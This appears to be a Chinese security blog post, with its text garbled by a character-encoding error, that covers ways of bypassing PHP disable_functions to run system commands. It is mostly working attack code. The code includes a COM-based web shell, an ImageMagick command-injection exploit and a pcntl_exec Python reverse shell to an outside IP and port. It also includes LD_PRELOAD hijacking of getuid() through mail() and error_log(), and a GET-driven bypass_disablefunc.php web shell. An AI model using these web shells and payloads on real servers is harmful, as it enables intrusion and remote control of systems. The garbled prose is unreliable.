<h3 id="0X01-ç³»ç»Ÿç»„ä»¶çš„æ”»å‡»"><a href="#0X01-ç³»ç»Ÿç»„ä»¶çš„æ”»å‡»" class="headerlink" title="0X01 ç³»ç»Ÿç»„ä»¶çš„æ”»å‡»"></a>0X01 ç³»ç»Ÿç»„ä»¶çš„æ”»å‡»</h3><h5 id="ç³»ç»Ÿç»„ä»¶çš„ç»•è¿‡"><a href="#ç³»ç»Ÿç»„ä»¶çš„ç»•è¿‡" class="headerlink" title="ç³»ç»Ÿç»„ä»¶çš„ç»•è¿‡"></a>ç³»ç»Ÿç»„ä»¶çš„ç»•è¿‡</h5><ul>
<li>å‰æ<ul>
<li>Window comç»„ä»¶ï¼ˆphp5.4ç‰ˆæœ¬ä»¥ä¸Šéœ€è¦è‡ªè¡Œæ·»åŠ æ‰©å±•ï¼‰</li>
<li>åœ¨php.iniæ–‡ä»¶ä¸­å¼€å¯</li>
</ul>
</li>
</ul>
<p><img src="/images/php-about/disable_function/php-ini-com.jpg" alt="php-ini-com"></p>
<ul>
<li>åˆ©ç”¨ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ã€€Shell.Applicationä¹Ÿèƒ½</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c "</span>.$command); <span class="comment">//è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ©ç”¨åçš„ç»“æœ</li>
</ul>
<p><img src="/images/php-about/disable_function/com-shell.png" alt="com-shell"></p>
<h5 id="åˆ©ç”¨ImageMagickæ¼æ´"><a href="#åˆ©ç”¨ImageMagickæ¼æ´" class="headerlink" title="åˆ©ç”¨ImageMagickæ¼æ´"></a>åˆ©ç”¨ImageMagickæ¼æ´</h5><ul>
<li>ç®€ä»‹<ul>
<li>ImageMagickæ˜¯ä¸€å¥—åŠŸèƒ½å¼ºå¤§ã€ç¨³å®šè€Œä¸”å¼€æºçš„å·¥å…·é›†å’Œå¼€å‘åŒ…ï¼Œå¯ä»¥ç”¨æ¥è¯»ã€å†™å’Œå¤„ç†è¶…è¿‡89ç§åŸºæœ¬æ ¼å¼çš„å›¾ç‰‡æ–‡ä»¶</li>
</ul>
</li>
<li>å½±å“ç‰ˆæœ¬ï¼šv6.9.3-9 æˆ– v7.0.1-0</li>
</ul>
<p><img src="/images/php-about/disable_function/phpinfo-imagick-version.png" alt="phpinfo-imagick-version"></p>
<ul>
<li>åˆ©ç”¨ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Disable Functions: "</span> . ini_get(<span class="string">'disable_functions'</span>) . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$command = PHP_SAPI == <span class="string">'cli'</span> ? $argv[<span class="number">1</span>] : $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> ($command == <span class="string">''</span>) &#123;</span><br><span class="line">    $command = <span class="string">'id'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill 'url(https://example.com/image.jpg"|<span class="subst">$command</span>")'</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"KKKK.mvg"</span>, $exploit);</span><br><span class="line">$thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">$thumb-&gt;readImage(<span class="string">'KKKK.mvg'</span>);</span><br><span class="line">$thumb-&gt;writeImage(<span class="string">'KKKK.png'</span>);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(<span class="string">"KKKK.mvg"</span>);</span><br><span class="line">unlink(<span class="string">"KKKK.png"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ©ç”¨æˆåŠŸçš„ç»“æœ<ul>
<li>â–² 2020.08.25 è„šæœ¬åœ¨cliçš„æƒ…å†µä¸‹ä¼šæŠ¥é”™ï¼Œåœ¨webè®¿é—®æ—¶ä¸ä¼šæŠ¥é”™ï¼Œä½†æ— æ³•æ‰§è¡ŒæˆåŠŸpayload</li>
</ul>
</li>
</ul>
<p><img src="" alt="imagick-shell"></p>
<h3 id="0X02-åˆ©ç”¨pcntl-exec"><a href="#0X02-åˆ©ç”¨pcntl-exec" class="headerlink" title="0X02 åˆ©ç”¨pcntl_exec"></a>0X02 åˆ©ç”¨pcntl_exec</h3><h5 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><ul>
<li>pcntlæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ‰©å±•ï¼Œå¯ä»¥æ”¯æŒphpçš„å¤šçº¿ç¨‹æ“ä½œã€‚(ä¸pythonç»“åˆåå¼¹shell) pcntl_execå‡½æ•°çš„ä½œç”¨æ˜¯åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åº</li>
</ul>
<h5 id="å½±å“èŒƒå›´ï¼šPHP-4-gt-4-2-0-PHP-5"><a href="#å½±å“èŒƒå›´ï¼šPHP-4-gt-4-2-0-PHP-5" class="headerlink" title="å½±å“èŒƒå›´ï¼šPHP 4 &gt;= 4.2.0, PHP 5"></a>å½±å“èŒƒå›´ï¼šPHP 4 &gt;= 4.2.0, PHP 5</h5><h5 id="åˆ©ç”¨ä»£ç "><a href="#åˆ©ç”¨ä»£ç " class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    pcntl_exec(<span class="string">"/usr/bin/python3"</span>,<span class="keyword">array</span>(<span class="string">'-c'</span>, <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("192.168.67.153",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="åˆ©ç”¨æˆåŠŸçš„ç»“æœ"><a href="#åˆ©ç”¨æˆåŠŸçš„ç»“æœ" class="headerlink" title="åˆ©ç”¨æˆåŠŸçš„ç»“æœ"></a>åˆ©ç”¨æˆåŠŸçš„ç»“æœ</h5><ul>
<li>åœ¨ç½‘é¡µç«¯ä¸Šè®¿é—®æ— æ³•åé“¾ä¸€ä¸ªshell</li>
<li>åœ¨å‘½ä»¤è¡Œçš„æƒ…å†µä¸‹æ‰ä¼šè¿”å›ä¸€ä¸ªshell</li>
</ul>
<p><img src="/images/php-about/disable_function/pcntl-exec-shell.png" alt="pcntl-exec-shell"></p>
<h3 id="0X03-åˆ©ç”¨ç¯å¢ƒå˜é‡LD-PRELOAD"><a href="#0X03-åˆ©ç”¨ç¯å¢ƒå˜é‡LD-PRELOAD" class="headerlink" title="0X03 åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOAD"></a>0X03 åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOAD</h3><h5 id="æ³¨å…¥æ€è·¯"><a href="#æ³¨å…¥æ€è·¯" class="headerlink" title="æ³¨å…¥æ€è·¯"></a>æ³¨å…¥æ€è·¯</h5><ul>
<li>åˆ©ç”¨æ¼æ´æ§åˆ¶ web å¯åŠ¨æ–°è¿›ç¨‹ a.bin</li>
<li>a.bin å†…éƒ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•° b()</li>
<li>b() ä½äºç³»ç»Ÿå…±äº«å¯¹è±¡ c.so ä¸­ï¼Œæ‰€ä»¥ç³»ç»Ÿä¸ºè¯¥è¿›ç¨‹åŠ è½½å…± c.so</li>
<li>â–² è‹¥åœ¨ c.so å‰ä¼˜å…ˆåŠ è½½å¯æ§çš„ c_evil.soï¼Œc_evil.so å†…å«ä¸ b() åŒåçš„æ¶æ„å‡½æ•°ï¼Œç”±äº c_evil.so ä¼˜å…ˆçº§è¾ƒé«˜ï¼Œæ‰€ä»¥ï¼Œa.bin å°†è°ƒç”¨åˆ° c_evil.so å†… b() è€Œéç³»ç»Ÿçš„ c.so å†… b()ï¼ŒåŒæ—¶ï¼Œc_evil.so å¯æ§ï¼Œè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„</li>
<li>â­ åˆ©ç”¨è¿‡ç¨‹<ul>
<li>æŸ¥çœ‹è¿›ç¨‹è°ƒç”¨ç³»ç»Ÿå‡½æ•°æ˜ç»†</li>
<li>æ“ä½œç³»ç»Ÿç¯å¢ƒä¸‹åŠ«æŒç³»ç»Ÿå‡½æ•°æ³¨å…¥ä»£ç </li>
<li>æ‰¾å¯»å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹çš„PHPå‡½æ•°</li>
<li>PHPç¯å¢ƒä¸‹åŠ«æŒç³»ç»Ÿå‡½æ•°æ³¨å…¥ä»£ç </li>
</ul>
</li>
</ul>
<h5 id="æ³¨å…¥åŸç†"><a href="#æ³¨å…¥åŸç†" class="headerlink" title="æ³¨å…¥åŸç†"></a>æ³¨å…¥åŸç†</h5><ul>
<li>LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸‹ä¸€ä¸ªæœ‰è¶£çš„ç¯å¢ƒå˜é‡ï¼šâ€œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„</li>
<li>æµ‹è¯•ä»£ç ï¼ˆä¹Ÿå¯é€šè¿‡getuidè¿›è¡Œæµ‹è¯•ï¼Œgetuidä¸ºå¸¸ç”¨ä¸”æ— éœ€å…¶ä»–å‚æ•°çš„å‡½æ•°ï¼‰</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> passwd[] = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage: %s &lt;password&gt;/n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Correct Password!/n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid Password!/n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿å­˜ä»£ç å¹¶è¿›è¡Œç¼–è¯‘ï¼š<code>gcc a.c -o a</code>ï¼Œå¹¶è¿è¡Œå°è¯•<ul>
<li>æ ¹æ®åˆ¤æ–­ä¼ å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦ç­‰äºâ€passwordâ€ï¼Œæ¥å¾—å‡ºä¸åŒç»“æœ</li>
<li>å…¶ä»–è°ƒç”¨äº†æ ‡å‡†Cå‡½æ•°strcmpå‡½æ•°æ¥æ¯”è¾ƒï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨è°ƒç”¨å‡½æ•°</li>
</ul>
</li>
</ul>
<p><img src="/images/php-about/disable_function/example-a-c-normal.png" alt="example-a-c-normal"></p>
<ul>
<li>ç¼–å†™ä¸€ä¸ªåŒåå‡½æ•°ï¼Œä»£ç å¦‚ä¸‹</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hack functio  n invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n"</span>, s1, s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¼–è¯‘ä»¥ä¸Šä»£ç ä¸ºåŠ¨æ€é“¾æ¥åº“ï¼š<code>gcc -fPIC -shared b.c -o b.so</code></li>
<li>é€šè¿‡LD_PRELOADæ¥è®¾ç½®å®ƒèƒ½è¢«å…¶ä»–è°ƒç”¨å®ƒçš„ç¨‹åºä¼˜å…ˆåŠ è½½ï¼š<code>export LD_PRELOAD=&quot;./b.so&quot;</code></li>
<li>å†æ¬¡è¿è¡Œa<ul>
<li>éšæ„è¾“å…¥å­—ç¬¦ä¸²éƒ½ä¼šæ˜¾ç¤ºå¯†ç æ­£å¸¸  -&gt;  ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼˜å…ˆåŠ è½½äº†è‡ªç¼–å†™ç¨‹åº</li>
<li>â–² å¦‚æœæŸä¸ªç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨äº†æŸä¸ªæ ‡å‡†çš„åŠ¨æ€é“¾æ¥åº“å‡½æ•°ï¼Œé‚£ä¹ˆæœ‰æœºä¼šé€šè¿‡LD_PRELOADæ¥è®¾ç½®ä¼˜å…ˆåŠ è½½è‡ªç¼–å†™çš„å‡½æ•°ï¼Œå®ç°åŠ«æŒ</li>
</ul>
</li>
</ul>
<p><img src="/images/php-about/disable_function/example-a-c-modify.png" alt="example-a-c-modify"></p>
<h5 id="æŸ¥çœ‹å…±äº«å¯¹è±¡ï¼Œä»¥åŠAPIè°ƒç”¨"><a href="#æŸ¥çœ‹å…±äº«å¯¹è±¡ï¼Œä»¥åŠAPIè°ƒç”¨" class="headerlink" title="æŸ¥çœ‹å…±äº«å¯¹è±¡ï¼Œä»¥åŠAPIè°ƒç”¨"></a>æŸ¥çœ‹å…±äº«å¯¹è±¡ï¼Œä»¥åŠAPIè°ƒç”¨</h5><ul>
<li><p>è¿è¡Œ<code>/usr/bin/id</code>ï¼Œé€šè¿‡<code>ldd /usr/bin/id</code>å¯æŸ¥çœ‹ç³»ç»Ÿä¸ºå…¶åŠ è½½çš„å…±äº«å¯¹è±¡</p>
</li>
<li><p>è¿è¡Œ<code>nm -D /usr/bin/id 2&gt;&amp;1</code> æˆ– <code>readelf -Ws /usr/bin/id</code>å¯æŸ¥çœ‹è¯¥ç¨‹åºå¯èƒ½è°ƒç”¨çš„ç³»ç»Ÿ API æ˜ç»†</p>
</li>
<li><p>è¿è¡Œ<code>strace -f /usr/bin/id 2&gt;&amp;1</code> è·Ÿè¸ªå®é™… API è°ƒç”¨æƒ…å†µï¼ˆå—ç¯å¢ƒå½±å“ï¼Œå¯èƒ½çœŸæ­£è¿è¡Œæ—¶è°ƒç”¨çš„APIå¯èƒ½åªæ˜¯readeflæŸ¥çœ‹çš„å­é›†ï¼‰</p>
</li>
</ul>
<h5 id="æŸ¥æ‰¾PHPå¯¹å…±äº«å¯¹è±¡ï¼Œä»¥åŠAPIè°ƒç”¨"><a href="#æŸ¥æ‰¾PHPå¯¹å…±äº«å¯¹è±¡ï¼Œä»¥åŠAPIè°ƒç”¨" class="headerlink" title="æŸ¥æ‰¾PHPå¯¹å…±äº«å¯¹è±¡ï¼Œä»¥åŠAPIè°ƒç”¨"></a>æŸ¥æ‰¾PHPå¯¹å…±äº«å¯¹è±¡ï¼Œä»¥åŠAPIè°ƒç”¨</h5><ul>
<li>â–² PHPåœ¨å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå¤„ç†å›¾ç‰‡ã€è¯·æ±‚ç½‘é¡µæˆ–è€…å‘é€é‚®ä»¶ç­‰ï¼Œå¯èƒ½ä¼šå¯ç”¨åˆ°å¤–éƒ¨ç¨‹åº</li>
<li>å¤„ç†å›¾ç‰‡ï¼Œè°ƒç”¨PHPå°è£…çš„ImageMagickåº“ï¼ŒæŸ¥çœ‹execve()æ–¹æ³•ï¼Œå¯åŠ¨PHPè§£é‡Šå™¨ï¼Œä½†æœªå¯åŠ¨æ–°è¿›ç¨‹</li>
<li>è¯·æ±‚ç½‘é¡µï¼Œè°ƒç”¨curl_init()ï¼ŒæŸ¥çœ‹execve()æ–¹æ³•ï¼Œå¯åŠ¨PHPè§£é‡Šå™¨ï¼Œä½†æœªå¯åŠ¨æ–°è¿›ç¨‹</li>
<li>å‘é€é‚®ä»¶ï¼Œè°ƒç”¨mail()ï¼ŒæŸ¥çœ‹execve()æ–¹æ³•ï¼Œå‘ç°mail()å†…éƒ¨å¯åŠ¨äº†/usr/sbin/sendmailå’Œ/usr/sbin/postdropä¸¤ä¸ªæ–°è¿›ç¨‹ï¼Œå¯åœ¨PHPç¯å¢ƒä¸‹åŠ«æŒç³»ç»Ÿå‡½æ•°æ³¨å…¥ä»£ç </li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li>â–² åŠ«æŒç³»ç»Ÿå‡½æ•°getuid()ï¼Œé€šè¿‡mail()çš„å‡½æ•°æ¥å®ç°ç»•è¿‡disable_function</li>
<li>åŠ«æŒgetuid()å‡½æ•°çš„ä»£ç </li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> getuid(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">"echo '!! evil command here !!'"</span>);  <span class="comment">//your evil command!!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¼–è¯‘å…±äº«å¯¹è±¡<code>gcc -shared -fPIC getuid_shadow.c -o getuid_shadow.so</code></li>
<li>mail.phpä»£ç ï¼Œå†…éƒ¨å¢åŠ è®¾ç½®LD_PRELOADçš„ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	putenv(<span class="string">"LD_PRELOAD=/var/www/html/getuid_shadow.so"</span>);</span><br><span class="line">	mail(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å°†mail.phpä»¥åŠå«æœ‰mail()å‡½æ•°çš„å…±äº«å¯¹è±¡getuid_shadow.soæ”¾å…¥webç›®å½•ä¸‹/var/www/html</li>
<li>æ‰§è¡Œmail.php</li>
</ul>
<p><img src="/images/php-about/disable_function/mail-getuid-exec.png" alt="mail-getuid-exec"></p>
<ul>
<li>â–² å¦‚æœmailå‡½æ•°ä¹Ÿè¢«ç¦ç”¨çš„è¯ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œerror_log()ä¹Ÿèƒ½è§¦å‘æ‰§è¡Œå‘½ä»¤</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	putenv(&quot;LD_PRELOAD=/var/www/html/getuid_shadow.so&quot;);</span><br><span class="line">	error_log(&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="bypass-disablefunc-php-æ¥è‡ªå¤§ä½¬çš„è„šæœ¬"><a href="#bypass-disablefunc-php-æ¥è‡ªå¤§ä½¬çš„è„šæœ¬" class="headerlink" title="bypass_disablefunc.php(æ¥è‡ªå¤§ä½¬çš„è„šæœ¬)"></a>bypass_disablefunc.php(æ¥è‡ªå¤§ä½¬çš„è„šæœ¬)</h5><ul>
<li><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ cmd å‚æ•°ï¼Œå¾…æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤</p>
</li>
<li><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ outpath å‚æ•°ï¼Œä¿å­˜å‘½ä»¤æ‰§è¡Œè¾“å‡ºç»“æœçš„æ–‡ä»¶è·¯å¾„ï¼Œä¾¿äºåœ¨é¡µé¢æ˜¾ç¤ºï¼Œéœ€æ³¨æ„æ–‡ä»¶è·¯å¾„çš„æƒé™</p>
</li>
<li><p>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯sopathï¼ŒæŒ‡å®šåŠ«æŒç³»ç»Ÿå‡½æ•°çš„å…±äº«å¯¹è±¡çš„ç»å¯¹è·¯å¾„ï¼Œéœ€æ³¨æ„webæ˜¯å¦å¯è·¨ç›®å½•è®¿é—®åˆ°</p>
</li>
<li><p>â–² è„šæœ¬ä»£ç </p>
<ul>
<li>æ‹¼æ¥å‘½ä»¤å’Œè¾“å‡ºè·¯å¾„æˆä¸ºå®Œæ•´çš„å‘½ä»¤è¡Œï¼Œä¸ç”¨åœ¨cmdå‚æ•°ä¸­é‡å®šå‘</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡ç¯å¢ƒéå†EVIL_CMDLINEåƒè‡ªç¼–è¯‘çš„å…±äº«soåº“ä¼ é€’å…·ä½“æ‰§è¡Œçš„å‘½ä»¤è¡Œä¿¡æ¯</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(<span class="string">"message"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="bypass-disablefunc-via-LD-PRELOAD"><a href="#bypass-disablefunc-via-LD-PRELOAD" class="headerlink" title="bypass_disablefunc_via_LD_PRELOAD"></a>bypass_disablefunc_via_LD_PRELOAD</h5><ul>
<li><p>è„šæœ¬ï¼š<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
</li>
<li><p>çœŸå®ç¯å¢ƒä¸‹çš„å­˜åœ¨çš„é—®é¢˜</p>
<ul>
<li>æŸäº›ç¯å¢ƒä¸­ï¼Œweb ç¦æ­¢å¯ç”¨ senmailã€ç”šè‡³ç³»ç»Ÿä¸Šæ ¹æœ¬æœªå®‰è£… sendmailï¼Œä¹Ÿå°±è°ˆä¸ä¸ŠåŠ«æŒ getuid()ï¼Œé€šå¸¸çš„ www-data æƒé™åˆä¸å¯èƒ½å»æ›´æ”¹ php.ini é…ç½®ã€å»å®‰è£… sendmail è½¯ä»¶</li>
<li>å³ä¾¿ç›®æ ‡å¯ä»¥å¯ç”¨ sendmailï¼Œç”±äºæœªå°†ä¸»æœºåï¼ˆhostname è¾“å‡ºï¼‰æ·»åŠ è¿› hosts ä¸­ï¼Œå¯¼è‡´æ¯æ¬¡è¿è¡Œ sendmail éƒ½è¦è€—æ—¶åŠåˆ†é’Ÿç­‰å¾…åŸŸåè§£æè¶…æ—¶è¿”å›ï¼Œwww-data ä¹Ÿæ— æ³•å°†ä¸»æœºååŠ å…¥ hosts</li>
</ul>
</li>
<li><p>â–² åŠ«æŒå…±äº«å¯¹è±¡</p>
<ul>
<li>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main()<br>ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ<code>__attribute((constructor))</code> ä¿®é¥°çš„å‡½æ•°<br>å› æ­¤ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼æ¥æ„é€ å‡½æ•°ï¼ŒæŠŠæˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤æ”¾åœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œæ‰§è¡Œæ—¶ç›´æ¥åŠ è½½ç¯å¢ƒå˜é‡çš„å‘½ä»¤ï¼Œå°±å¯ä»¥åšåˆ°ç»•è¿‡äº†</li>
</ul>
